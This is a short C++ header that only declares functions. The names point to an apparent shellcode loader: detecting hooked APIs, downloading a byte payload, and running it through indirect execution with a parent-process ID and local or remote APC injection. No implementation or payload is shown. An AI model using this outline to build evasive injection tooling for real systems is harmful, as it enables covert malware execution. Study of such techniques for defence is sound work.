#pragma once
#include <vector>
#include <Windows.h>

// Functions definitions
BOOL isItHooked(LPVOID addr);
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
DWORD GetPID();

void Indirect_RawExec_ppid(std::vector<BYTE> sh, DWORD exPID);
void IndirectAPC();
void IndirectRemoteAPC(DWORD exPID);


